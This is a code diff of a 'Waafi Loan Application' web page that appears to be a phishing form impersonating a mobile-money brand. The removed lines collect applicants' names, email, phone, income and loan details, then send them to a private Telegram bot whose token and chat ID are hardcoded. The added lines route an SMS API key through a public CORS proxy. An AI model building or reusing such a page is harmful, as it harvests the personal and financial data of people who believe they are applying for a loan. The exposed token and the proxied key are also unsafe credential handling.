@@ -1,73 +1,3 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Waafi Loan Application</title>
-<style>
-body { font-family: Arial, sans-serif; margin:0; background:#f5f5f5; }
-.header { background: linear-gradient(90deg, #a8e063, #00B347); padding:15px; color:white; text-align:center; font-weight:bold; font-size:20px; }
-.container { padding:20px; max-width:600px; margin:auto; }
-.card { background:white; padding:20px; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,0.1); margin-bottom:20px; }
-h3 { color:#00B347; margin-top:0; }
-.grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin:10px 0; }
-.option { padding:15px; border:2px solid #ddd; border-radius:10px; text-align:center; cursor:pointer; font-weight:bold; }
-.option.selected { border-color:#00B347; background:#e8f5e9; }
-label { display:block; margin:15px 0 5px 0; font-weight:bold; }
-input, select { width:100%; padding:12px; border:1px solid #ddd; border-radius:8px; box-sizing:border-box; }
-.btn { width:100%; padding:16px; border:none; border-radius:8px; font-size:18px; font-weight:bold; background: linear-gradient(90deg, #a8e063, #00B347); color:white; cursor:pointer; margin-top:10px; }
-</style>
-</head>
-<body>
-<div class="header">Waafi - Loan Application</div>
-<div class="container">
-<div class="card">
-<h3>Step 1: Loan Details</h3>
-<label>Loan Type</label>
-<div class="grid">
-<div class="option" onclick="selectLoan(this,'Personal Loan')">Personal</div>
-<div class="option" onclick="selectLoan(this,'Business Loan')">Business</div>
-<div class="option" onclick="selectLoan(this,'Education Loan')">Education</div>
-<div class="option" onclick="selectLoan(this,'Home Loan')">Home</div>
-</div>
-<label>Loan Amount ($)</label><input id="amount" type="number" placeholder="5000">
-<label>Loan Period</label>
-<select id="period"><option>12 months</option><option>24 months</option><option>36 months</option></select>
-<label>Loan Purpose</label><input id="purpose" placeholder="e.g. Business capital">
-</div>
-
-<div class="card">
-<h3>Step 2: Personal Info + OTP</h3>
-<label>First Name</label><input id="fname" placeholder="Ahmed">
-<label>Last Name</label><input id="lname" placeholder="Mohamed">
-<label>Email</label><input id="email" type="email" placeholder="ahmed@gmail.com">
-<label>Phone Number</label><input id="phone" type="number" placeholder="61xxxxxxx">
-<button class="btn" type="button" onclick="sendOTP()" style="background:#00B347;">SEND OTP</button>
-
-<div id="otpSection" style="display:none; margin-top:15px;">
-  <label>Enter OTP sent to your phone</label>
-  <input id="userOTP" type="number" placeholder="1234">
-  <button class="btn" type="button" onclick="verifyAndSend()">VERIFY & SUBMIT</button>
-</div>
-</div>
-
-<div class="card">
-<h3>Step 3: Work Info</h3>
-<label>Work Status</label><select id="work"><option>Employee</option><option>Self Employed</option><option>Student</option></select>
-<label>Annual Income ($)</label><input id="income" type="number" placeholder="25000">
-</div>
-</div>
-
-<script>
-const BOT_TOKEN = "8811313030:AAHsQrh9DveSLEB2eRNmVPJF_2HtMGtJJ7A";
-const CHAT_ID = "8630213836";
-let loanType = '';
-let generatedOTP = '';
-
-function selectLoan(el, type) {
-  document.querySelectorAll('.option').forEach(o=>o.classList.remove('selected'));
-  el.classList.add('selected'); loanType = type;
-}
-
 async function sendOTP() {
   const phone = document.getElementById('phone').value;
   if(phone.length < 9) return alert('Enter valid phone number');
@@ -80,56 +10,18 @@ async function sendOTP() {
   formData.append('username', 'sandbox');
   formData.append('to', `+252${phone}`);
   formData.append('message', message);
+  formData.append('apiKey', 'PASTE_YOUR_API_KEY_HERE');
 
   try {
-    const res = await fetch("https://api.sandbox.africastalking.com/version1/messaging", {
+    // Using corsproxy to bypass the browser block
+    const res = await fetch("https://corsproxy.io/?https://api.sandbox.africastalking.com/version1/messaging", {
       method: "POST",
-      headers: { "apiKey": "PASTE_YOUR_API_KEY_HERE" },
       body: formData
     });
     const data = await res.json();
-    if(data.SMSMessageData.Recipients[0].status === 'Success') {
+    if(data.SMSMessageData && data.SMSMessageData.Recipients[0].status === 'Success') {
       alert('✅ OTP Sent to +252' + phone);
       document.getElementById('otpSection').style.display = 'block';
-    } else { alert('❌ Failed to send SMS'); }
+    } else { alert('❌ Failed to send SMS: ' + JSON.stringify(data)); }
   } catch(e) { alert('❌ Error: ' + e.message); }
 }
-
-function verifyAndSend() {
-  const userOTP = document.getElementById('userOTP').value;
-  if(userOTP!= generatedOTP) return alert('❌ Wrong OTP. Try again');
-  
-  const data = {
-    loanType: loanType, amount: document.getElementById('amount').value,
-    period: document.getElementById('period').value, purpose: document.getElementById('purpose').value,
-    fname: document.getElementById('fname').value, lname: document.getElementById('lname').value,
-    email: document.getElementById('email').value, phone: document.getElementById('phone').value,
-    work: document.getElementById('work').value, income: document.getElementById('income').value,
-  };
-  if(!data.fname) return alert('Please fill Name');
-
-  const message = `🔥 NEW VERIFIED WAAFI APPLICATION 🔥
-
-👤 NAME: ${data.fname} ${data.lname}
-📧 EMAIL: ${data.email}
-📱 PHONE: +252 ${data.phone} ✅ VERIFIED
-
-💰 LOAN: ${data.loanType}
-💵 AMOUNT: $${data.amount}
-📅 PERIOD: ${data.period}
-🎯 PURPOSE: ${data.purpose}
-
-💼 WORK: ${data.work}
-📈 INCOME: $${data.income}`;
-
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-  })
- .then(() => { alert("✅ Verified! Application Sent. We will call you in 24h."); })
- .catch(() => alert("❌ Error sending"));
-}
-</script>
-</body>
-</html>
